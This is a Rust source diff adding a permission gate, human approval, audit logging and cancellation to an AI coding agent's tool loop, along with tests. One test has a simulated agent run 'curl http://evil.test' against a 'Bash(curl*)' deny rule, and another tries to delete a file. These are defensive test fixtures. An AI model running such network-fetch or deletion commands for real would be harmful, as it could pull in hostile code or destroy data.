@@ -1,5 +1,7 @@
 //! Agent loop entry point.
 
+use std::sync::Arc;
+
 use kuncode_core::{
     completion::{
         AssistantContent, CompletionModel, CompletionRequest, CompletionRequestBuilder, Message,
@@ -7,8 +9,18 @@ use kuncode_core::{
     },
     non_empty_vec::NonEmptyVec,
 };
+use tokio_util::sync::CancellationToken;
 
-use crate::{error::AgentError, registry::ToolRegistry, session::AgentSession};
+use crate::{
+    error::AgentError,
+    permission::{
+        ApprovalOutcome, Approver, AutoApprove, DenyReason, PermissionPolicy, PermissionRequest,
+        RuleOrigin, Verdict, evaluate,
+    },
+    registry::ToolRegistry,
+    session::AgentSession,
+    tool::{ToolContext, ToolError, ToolOutput},
+};
 
 const DEFAULT_MAX_ITERATIONS: usize = 50;
 
@@ -65,6 +77,10 @@ pub struct AgentRunner<M> {
     model: M,
     registry: ToolRegistry,
     config: AgentConfig,
+    /// Static permission rules, shared read-only across turns.
+    policy: Arc<PermissionPolicy>,
+    /// Side-effecting approval layer consulted on an `Ask` verdict.
+    approver: Arc<dyn Approver>,
 }
 
 impl<M> AgentRunner<M>
@@ -72,6 +88,10 @@ where
     M: CompletionModel,
 {
     /// Creates a runner with default loop configuration.
+    ///
+    /// Defaults to the built-in deny rules and an [`AutoApprove`] approver, so
+    /// dangerous commands are still blocked but nothing prompts. Callers that
+    /// want a human in the loop set one via [`with_approver`](Self::with_approver).
     pub fn new(model: M, registry: ToolRegistry) -> Self {
         Self::with_config(model, registry, AgentConfig::default())
     }
@@ -82,7 +102,21 @@ where
             model,
             registry,
             config,
+            policy: Arc::new(PermissionPolicy::builtin()),
+            approver: Arc::new(AutoApprove),
         }
+    }
+
+    /// Replaces the static permission policy.
+    pub fn with_policy(mut self, policy: PermissionPolicy) -> Self {
+        self.policy = Arc::new(policy);
+        self
+    }
+
+    /// Replaces the approval layer (e.g. a terminal prompt in the CLI).
+    pub fn with_approver(mut self, approver: Arc<dyn Approver>) -> Self {
+        self.approver = approver;
+        self
     }
 
     /// Appends a user prompt, then advances the transcript until a final answer.
@@ -91,14 +125,37 @@ where
         session: &mut AgentSession,
         prompt: impl Into<String>,
     ) -> Result<AgentTurn, AgentError> {
+        self.run_turn_with(session, prompt, CancellationToken::new())
+            .await
+    }
+
+    /// Like [`run_turn`](Self::run_turn) but with a caller-owned cancellation
+    /// token (wire it to Ctrl-C for interruptible turns).
+    pub async fn run_turn_with(
+        &self,
+        session: &mut AgentSession,
+        prompt: impl Into<String>,
+        cancel: CancellationToken,
+    ) -> Result<AgentTurn, AgentError> {
         session.push_user(prompt);
-        self.continue_session(session).await
+        self.continue_session_with(session, cancel).await
     }
 
     /// Advances an existing transcript in place until the model stops calling tools.
     pub async fn continue_session(
         &self,
         session: &mut AgentSession,
+    ) -> Result<AgentTurn, AgentError> {
+        self.continue_session_with(session, CancellationToken::new())
+            .await
+    }
+
+    /// Like [`continue_session`](Self::continue_session) but with a caller-owned
+    /// cancellation token.
+    pub async fn continue_session_with(
+        &self,
+        session: &mut AgentSession,
+        cancel: CancellationToken,
     ) -> Result<AgentTurn, AgentError> {
         if session.is_empty() {
             return Err(AgentError::EmptyTranscript);
@@ -107,7 +164,7 @@ where
         let mut usage = Usage::default();
 
         for iteration in 0..self.config.max_iterations {
-            let iteration_result = self.run_iteration(session).await?;
+            let iteration_result = self.run_iteration(session, &cancel).await?;
             usage += iteration_result.usage;
 
             if iteration_result.tool_calls.is_empty() {
@@ -118,7 +175,7 @@ where
                 });
             }
 
-            self.execute_tool_calls(session, iteration_result.tool_calls)
+            self.execute_tool_calls(session, iteration_result.tool_calls, &cancel)
                 .await?;
         }
 
@@ -132,9 +189,17 @@ where
     async fn run_iteration(
         &self,
         session: &mut AgentSession,
+        cancel: &CancellationToken,
     ) -> Result<IterationResult, AgentError> {
         let request = self.build_request(session)?;
-        let response = self.model.completion(request).await?;
+        // Race the model call against cancellation. Waiting on the model is the
+        // most common place a user hits Ctrl-C, so the token must cover it — not
+        // just the later tool approval/execution. Dropping the future cancels
+        // the in-flight request (e.g. the provider's HTTP call).
+        let response = tokio::select! {
+            result = self.model.completion(request) => result?,
+            _ = cancel.cancelled() => return Err(AgentError::Cancelled),
+        };
 
         let tool_calls = pending_tool_calls(&response.choice);
         let usage = response.usage;
@@ -154,24 +219,123 @@ where
         &self,
         session: &mut AgentSession,
         tool_calls: Vec<PendingToolCall>,
+        cancel: &CancellationToken,
     ) -> Result<(), AgentError> {
-        for tool_call in tool_calls {
-            let PendingToolCall {
-                id,
-                call_id,
-                name,
-                arguments,
-            } = tool_call;
+        for index in 0..tool_calls.len() {
+            let tool_call = &tool_calls[index];
+            let ctx = ToolContext::with_cancel(cancel.clone());
 
-            let output = match self.registry.call(&name, arguments).await {
-                Ok(output) => output,
-                Err(source) => return Err(AgentError::Tool { name, source }),
-            };
-
-            session.push(tool_result_message(id, call_id, output.to_model_content()));
+            match self
+                .gated_call(session, &tool_call.name, tool_call.arguments.clone(), &ctx)
+                .await
+            {
+                Ok(output) => session.push(tool_result_message(
+                    tool_call.id.clone(),
+                    tool_call.call_id.clone(),
+                    output.to_model_content(),
+                )),
+                Err(error) => {
+                    // The turn is unwinding (user abort, cancellation, or a
+                    // harness-level tool error) with this tool_call — and any
+                    // that follow it — still unpaired. Pair each with a
+                    // synthetic result so the assistant's tool_call message is
+                    // never left dangling: most providers reject a request
+                    // whose tool_call has no matching tool_result before the
+                    // next user message.
+                    for unpaired in &tool_calls[index..] {
+                        session.push(tool_result_message(
+                            unpaired.id.clone(),
+                            unpaired.call_id.clone(),
+                            interrupted_tool_result(),
+                        ));
+                    }
+                    return Err(error);
+                }
+            }
         }
 
         Ok(())
+    }
+
+    /// Runs the permission gate, then dispatches — both racing cancellation.
+    ///
+    /// Returns a model-recoverable [`ToolOutput`] for unknown tools, bad
+    /// arguments, and denials (the loop feeds these back). Only a user `Abort`
+    /// or a cancelled token escalates to [`AgentError::Cancelled`], unwinding
+    /// the whole turn.
+    async fn gated_call(
+        &self,
+        session: &mut AgentSession,
+        name: &str,
+        arguments: serde_json::Value,
+        ctx: &ToolContext,
+    ) -> Result<ToolOutput, AgentError> {
+        // 1. Resolve the tool; unknown tools never reach the gate.
+        let Some(tool) = self.registry.get(name) else {
+            return Ok(ToolOutput::failure(
+                "unknown_tool",
+                format!("tool `{name}` is not registered"),
+            ));
+        };
+
+        // 2. Compute the permission request. A parse failure short-circuits to
+        //    `invalid_arguments`, so bad arguments never reach the approver.
+        let request = match tool.permission(&arguments, ctx) {
+            Ok(request) => request,
+            Err(failure) => return Ok(failure),
+        };
+
+        let resource = request.resource.as_deref().unwrap_or("-");
+
+        // 3. Pure verdict against policy + session state.
+        match evaluate(&self.policy, session.permissions(), &request) {
+            Verdict::Allow => audit(&request, resource, "allow", None),
+            Verdict::Deny(reason) => {
+                audit(&request, resource, "deny", Some(&reason.rule));
+                return Ok(rule_denied_output(&reason));
+            }
+            Verdict::Ask => {
+                // 4. Escalate to the approver, racing cancellation.
+                let outcome = tokio::select! {
+                    outcome = self.approver.request(&request) => outcome,
+                    _ = ctx.cancel.cancelled() => ApprovalOutcome::Abort,
+                };
+                match outcome {
+                    ApprovalOutcome::AllowOnce => audit(&request, resource, "allow_once", None),
+                    ApprovalOutcome::AllowAlways(rule) => {
+                        audit(&request, resource, "allow_always", Some(&rule.raw));
+                        session.permissions_mut().grant_allow(rule);
+                    }
+                    ApprovalOutcome::DenyOnce => {
+                        audit(&request, resource, "deny_once", None);
+                        return Ok(user_denied_output(false));
+                    }
+                    ApprovalOutcome::DenyAlways(rule) => {
+                        audit(&request, resource, "deny_always", Some(&rule.raw));
+                        session.permissions_mut().grant_deny(rule);
+                        return Ok(user_denied_output(true));
+                    }
+                    ApprovalOutcome::Abort => {
+                        audit(&request, resource, "abort", None);
+                        return Err(AgentError::Cancelled);
+                    }
+                }
+            }
+        }
+
+        // 5. Execute, racing cancellation so a long tool can be interrupted.
+        let result = tokio::select! {
+            result = tool.call(arguments, ctx) => result,
+            _ = ctx.cancel.cancelled() => Err(ToolError::Cancelled),
+        };
+        match result {
+            Ok(output) => Ok(output),
+            Err(ToolError::Cancelled) => Err(AgentError::Cancelled),
+            Err(source) => Err(AgentError::Tool {
+                name: name.to_string(),
+                source,
+            }),
+        }
     }
 
     fn build_request(&self, session: &AgentSession) -> Result<CompletionRequest, AgentError> {
@@ -228,6 +392,58 @@ fn pending_tool_calls(content: &NonEmptyVec<AssistantContent>) -> Vec<PendingToo
         .collect()
 }
 
+/// Emits one structured permission audit event (§13). With no `tracing`
+/// subscriber installed this is a no-op; the CLI installs one so `RUST_LOG`
+/// surfaces decisions.
+fn audit(request: &PermissionRequest, resource: &str, decision: &str, rule: Option<&str>) {
+    tracing::info!(
+        target: "kuncode::permission",
+        tool = %request.tool,
+        action = ?request.action,
+        resource = %resource,
+        decision = %decision,
+        rule = rule.unwrap_or("-"),
+        "permission decision",
+    );
+}
+
+/// Builds the model-recoverable output for a request blocked by a rule
+/// (built-in deny, project/CLI deny, or a session deny-grant). The message tells
+/// the model not to retry — denial is a clear result, like a non-zero exit.
+fn rule_denied_output(reason: &DenyReason) -> ToolOutput {
+    ToolOutput::failure(
+        "permission_denied",
+        format!(
+            "blocked by {} rule `{}`. Do not retry; choose a different approach or ask the user.",
+            origin_label(reason.origin),
+            reason.rule
+        ),
+    )
+}
+
+/// Builds the model-recoverable output for a request the user denied at a
+/// prompt. `always` distinguishes a one-off "no" from a remembered deny-grant.
+fn user_denied_output(always: bool) -> ToolOutput {
+    let lead = if always {
+        "The user denied this and will not be asked again for similar calls."
+    } else {
+        "The user denied this action."
+    };
+    ToolOutput::failure(
+        "permission_denied",
+        format!("{lead} Do not retry; choose a different approach or ask the user."),
+    )
+}
+
+fn origin_label(origin: RuleOrigin) -> &'static str {
+    match origin {
+        RuleOrigin::Builtin => "built-in",
+        RuleOrigin::ProjectSettings => "project",
+        RuleOrigin::CliFlag => "command-line",
+        RuleOrigin::SessionGrant => "session",
+    }
+}
+
 fn tool_result_message(id: String, call_id: Option<String>, content: String) -> Message {
     Message::User {
         content: NonEmptyVec::new(UserContent::ToolResult(ToolResult {
@@ -236,6 +452,19 @@ fn tool_result_message(id: String, call_id: Option<String>, content: String) -> 
             content: NonEmptyVec::new(ToolResultContent::text(content)),
         })),
     }
+}
+
+/// A synthetic tool result that pairs a tool_call the turn never executed —
+/// because it was aborted or cancelled first. Without it the assistant's
+/// tool_call message would dangle, and most providers reject a tool_call with
+/// no matching tool_result on the next request. Shaped like a normal
+/// [`ToolOutput`] failure so the model sees the usual envelope.
+fn interrupted_tool_result() -> String {
+    ToolOutput::<serde_json::Value>::failure(
+        "cancelled",
+        "Tool call not executed: the turn was interrupted before this tool returned.",
+    )
+    .to_model_content()
 }
 
 fn assistant_content_at(
@@ -272,17 +501,125 @@ mod tests {
         sync::{Arc, Mutex},
     };
 
+    use async_trait::async_trait;
     use kuncode_core::completion::{
         AssistantContent, CompletionError, CompletionRequest, CompletionResponse, CompletionStream,
-        Message, ToolResultContent, Usage, UserContent,
+        Message, ToolDefinition, ToolResultContent, Usage, UserContent,
     };
     use kuncode_core::non_empty_vec::NonEmptyVec;
+    use schemars::JsonSchema;
+    use serde::Deserialize;
     use serde_json::Value;
+    use tokio_util::sync::CancellationToken;
 
     use super::{AgentConfig, AgentRunner};
     use crate::{
-        error::AgentError, registry::ToolRegistry, session::AgentSession, tool::bash::Bash,
+        error::AgentError,
+        permission::{
+            ApprovalOutcome, PermissionAction, PermissionPolicy, PermissionRequest, RuleOrigin,
+            ScriptedApprover, parse_rule,
+        },
+        registry::ToolRegistry,
+        session::AgentSession,
+        tool::{ToolContext, ToolOutput, TypedTool, bash::Bash, definition_for},
     };
+
+    /// A tool whose `run` never completes — used to test that a cancellation
+    /// token interrupts an in-flight tool call. It is a `Read` so the gate
+    /// allows it straight through to execution with no approval prompt.
+    struct HangTool {
+        definition: ToolDefinition,
+    }
+
+    #[derive(Deserialize, JsonSchema)]
+    struct HangArgs {}
+
+    impl HangTool {
+        fn new() -> Self {
+            Self {
+                definition: definition_for::<HangArgs>("hang", "Never returns"),
+            }
+        }
+    }
+
+    #[async_trait]
+    impl TypedTool for HangTool {
+        type Args = HangArgs;
+        type Output = Value;
+
+        fn definition(&self) -> &ToolDefinition {
+            &self.definition
+        }
+
+        fn permission(&self, _args: &HangArgs, _ctx: &ToolContext) -> PermissionRequest {
+            PermissionRequest::new("hang", PermissionAction::Read, None, "hang")
+        }
+
+        async fn run(&self, _args: HangArgs, ctx: &ToolContext) -> ToolOutput<Value> {
+            // Cancel from inside the running tool, then never return: this
+            // deterministically drives the runner's execute-stage `select!` to
+            // the cancellation branch without pre-cancelling the token (which
+            // would also race the model stage).
+            ctx.cancel.cancel();
+            std::future::pending().await
+        }
+    }
+
+    /// A model whose `completion` never returns — used to test that a
+    /// cancellation token interrupts an in-flight *model* request, not only a
+    /// tool approval/execution.
+    #[derive(Clone, Default)]
+    struct HangModel;
+
+    impl kuncode_core::completion::CompletionModel for HangModel {
+        type Response = Value;
+        type Client = ();
+
+        fn make(_client: &Self::Client, _model: impl Into<String>) -> Self {
+            Self
+        }
+
+        async fn completion(
+            &self,
+            _request: CompletionRequest,
+        ) -> Result<CompletionResponse<Self::Response>, CompletionError> {
+            std::future::pending().await
+        }
+
+        async fn stream(
+            &self,
+            _request: CompletionRequest,
+        ) -> Result<CompletionStream, CompletionError> {
+            unimplemented!("hang model does not stream")
+        }
+    }
+
+    /// Extracts the text of the tool-result user message at `index`.
+    fn tool_result_text(session: &AgentSession, index: usize) -> String {
+        match &session.messages()[index] {
+            Message::User { content } => {
+                let UserContent::ToolResult(result) = content.first() else {
+                    panic!("expected tool result content at {index}");
+                };
+                let ToolResultContent::Text(text) = result.content.first();
+                text.text_ref().to_string()
+            }
+            other => panic!("expected tool result user message at {index}, got {other:?}"),
+        }
+    }
+
+    /// Extracts the tool-call id the tool-result user message at `index` answers.
+    fn tool_result_id(session: &AgentSession, index: usize) -> String {
+        match &session.messages()[index] {
+            Message::User { content } => {
+                let UserContent::ToolResult(result) = content.first() else {
+                    panic!("expected tool result content at {index}");
+                };
+                result.id.clone()
+            }
+            other => panic!("expected tool result user message at {index}, got {other:?}"),
+        }
+    }
 
     async fn bash() -> Bash {
         Bash::from_current_dir()
@@ -339,8 +676,14 @@ mod tests {
     }
 
     fn response(content: AssistantContent) -> CompletionResponse<Value> {
+        response_many(vec![content])
+    }
+
+    /// A response whose assistant message carries several content blocks (e.g.
+    /// multiple tool calls in one turn).
+    fn response_many(contents: Vec<AssistantContent>) -> CompletionResponse<Value> {
         CompletionResponse {
-            choice: NonEmptyVec::new(content),
+            choice: NonEmptyVec::try_from(contents).expect("at least one content block"),
             usage: Usage {
                 input_tokens: 1,
                 output_tokens: 2,
@@ -536,5 +879,213 @@ mod tests {
             .expect_err("empty transcript is invalid");
 
         assert!(matches!(err, AgentError::EmptyTranscript));
+    }
+
+    #[tokio::test]
+    async fn deny_rule_blocks_tool_with_permission_denied() {
+        let model = FakeModel::new([
+            response(AssistantContent::tool_call(
+                "call_1",
+                "bash",
+                serde_json::json!({ "cmd": "curl http://evil.test" }),
+            )),
+            response(AssistantContent::text("understood")),
+        ]);
+        let mut registry = ToolRegistry::new();
+        registry.register(bash().await);
+        let mut policy = PermissionPolicy::new();
+        policy
+            .deny
+            .extend(parse_rule("Bash(curl*)", RuleOrigin::ProjectSettings).unwrap());
+        let runner = AgentRunner::new(model, registry).with_policy(policy);
+        let mut session = AgentSession::new();
+
+        runner
+            .run_turn(&mut session, "fetch the script")
+            .await
+            .expect("a denial is model-recoverable, so the turn still completes");
+
+        // The tool never ran; the model got a clear permission_denied result.
+        let result = tool_result_text(&session, 2);
+        assert!(result.contains("permission_denied"), "got {result}");
+        assert!(result.contains("Bash(curl*)"), "got {result}");
+    }
+
+    #[tokio::test]
+    async fn denied_at_prompt_is_model_recoverable() {
+        let model = FakeModel::new([
+            response(AssistantContent::tool_call(
+                "call_1",
+                "bash",
+                serde_json::json!({ "cmd": "rm notes.txt" }),
+            )),
+            response(AssistantContent::text("ok, leaving it")),
+        ]);
+        let mut registry = ToolRegistry::new();
+        registry.register(bash().await);
+        // Execute defaults to Ask; the user says no this once.
+        let runner = AgentRunner::new(model, registry)
+            .with_approver(Arc::new(ScriptedApprover::new([ApprovalOutcome::DenyOnce])));
+        let mut session = AgentSession::new();
+
+        let turn = runner
+            .run_turn(&mut session, "clean up")
+            .await
+            .expect("a user denial is model-recoverable");
+
+        assert_eq!(turn.final_text(&session), "ok, leaving it");
+        assert!(
+            tool_result_text(&session, 2).contains("permission_denied"),
+            "expected a permission_denied result"
+        );
+    }
+
+    #[tokio::test]
+    async fn allow_always_grant_skips_the_second_prompt() {
+        let model = FakeModel::new([
+            response(AssistantContent::tool_call(
+                "call_1",
+                "bash",
+                serde_json::json!({ "cmd": "printf one" }),
+            )),
+            response(AssistantContent::tool_call(
+                "call_2",
+                "bash",
+                serde_json::json!({ "cmd": "printf two" }),
+            )),
+            response(AssistantContent::text("done")),
+        ]);
+        let mut registry = ToolRegistry::new();
+        registry.register(bash().await);
+        let grant = parse_rule("Bash(printf*)", RuleOrigin::SessionGrant).unwrap()[0].clone();
+        // Exactly ONE scripted outcome: if the second call also prompted, the
+        // scripted approver would panic ("ran out of outcomes"). A clean pass
+        // proves the session grant short-circuited the gate.
+        let runner =
+            AgentRunner::new(model, registry).with_approver(Arc::new(ScriptedApprover::new([
+                ApprovalOutcome::AllowAlways(grant),
+            ])));
+        let mut session = AgentSession::new();
+
+        let turn = runner
+            .run_turn(&mut session, "print twice")
+            .await
+            .expect("both calls run, the second via the grant");
+
+        assert_eq!(turn.final_text(&session), "done");
+        assert!(tool_result_text(&session, 2).contains("\"stdout\":\"one\""));
+        assert!(tool_result_text(&session, 4).contains("\"stdout\":\"two\""));
+        // The grant is recorded on the session for later turns too.
+        assert_eq!(session.permissions().allow_grants().len(), 1);
+    }
+
+    #[tokio::test]
+    async fn abort_at_prompt_cancels_the_turn() {
+        let model = FakeModel::new([response(AssistantContent::tool_call(
+            "call_1",
+            "bash",
+            serde_json::json!({ "cmd": "printf hi" }),
+        ))]);
+        let mut registry = ToolRegistry::new();
+        registry.register(bash().await);
+        let runner = AgentRunner::new(model, registry)
+            .with_approver(Arc::new(ScriptedApprover::new([ApprovalOutcome::Abort])));
+        let mut session = AgentSession::new();
+
+        let err = runner
+            .run_turn(&mut session, "do it")
+            .await
+            .expect_err("abort unwinds the whole turn");
+
+        assert!(matches!(err, AgentError::Cancelled));
+    }
+
+    #[tokio::test]
+    async fn abort_pairs_every_tool_call_with_a_result() {
+        // One assistant turn emits TWO tool calls; the user aborts at the first
+        // approval prompt. Both tool_calls must still get a tool_result, or the
+        // assistant message dangles and the next turn's request is rejected.
+        let model = FakeModel::new([response_many(vec![
+            AssistantContent::tool_call(
+                "call_1",
+                "bash",
+                serde_json::json!({ "cmd": "printf one" }),
+            ),
+            AssistantContent::tool_call(
+                "call_2",
+                "bash",
+                serde_json::json!({ "cmd": "printf two" }),
+            ),
+        ])]);
+        let mut registry = ToolRegistry::new();
+        registry.register(bash().await);
+        let runner = AgentRunner::new(model, registry)
+            .with_approver(Arc::new(ScriptedApprover::new([ApprovalOutcome::Abort])));
+        let mut session = AgentSession::new();
+
+        let err = runner
+            .run_turn(&mut session, "do two things")
+            .await
+            .expect_err("abort unwinds the whole turn");
+        assert!(matches!(err, AgentError::Cancelled));
+
+        // Transcript: user, assistant(2 tool_calls), tool_result(call_1),
+        // tool_result(call_2) — every tool_call paired, so it is re-sendable.
+        assert_eq!(session.messages().len(), 4);
+        assert_eq!(tool_result_id(&session, 2), "call_1");
+        assert_eq!(tool_result_id(&session, 3), "call_2");
+        assert!(tool_result_text(&session, 2).contains("cancelled"));
+        assert!(tool_result_text(&session, 3).contains("cancelled"));
+    }
+
+    #[tokio::test]
+    async fn cancellation_token_interrupts_a_running_tool() {
+        let model = FakeModel::new([response(AssistantContent::tool_call(
+            "call_1",
+            "hang",
+            serde_json::json!({}),
+        ))]);
+        let mut registry = ToolRegistry::new();
+        registry.register(HangTool::new());
+        let runner = AgentRunner::new(model, registry);
+        let mut session = AgentSession::new();
+
+        // A fresh (un-cancelled) token: the model stage runs normally and the
+        // `HangTool` cancels mid-run, so the interrupt lands specifically on the
+        // tool-execution `select!`.
+        let cancel = CancellationToken::new();
+
+        let err = runner
+            .run_turn_with(&mut session, "hang please", cancel)
+            .await
+            .expect_err("a tool that cancels mid-run interrupts the call");
+
+        assert!(matches!(err, AgentError::Cancelled));
+        // The cancelled tool_call is still paired with a synthetic result, so
+        // the transcript stays re-sendable: user, assistant(1 call), tool_result.
+        assert_eq!(session.messages().len(), 3);
+        assert!(tool_result_text(&session, 2).contains("cancelled"));
+    }
+
+    #[tokio::test]
+    async fn cancellation_token_interrupts_a_model_request() {
+        let runner = AgentRunner::new(HangModel, ToolRegistry::new());
+        let mut session = AgentSession::new();
+
+        // Pre-cancelled token: the never-returning model loses the race to the
+        // cancellation branch deterministically, proving the gate now wraps the
+        // model call — not only tool approval/execution.
+        let cancel = CancellationToken::new();
+        cancel.cancel();
+
+        let err = runner
+            .run_turn_with(&mut session, "think forever", cancel)
+            .await
+            .expect_err("a cancelled token interrupts the model request");
+
+        assert!(matches!(err, AgentError::Cancelled));
+        // The turn aborted before any assistant message was appended: only the
+        // user prompt is in the transcript.
+        assert_eq!(session.messages().len(), 1);
     }
 }
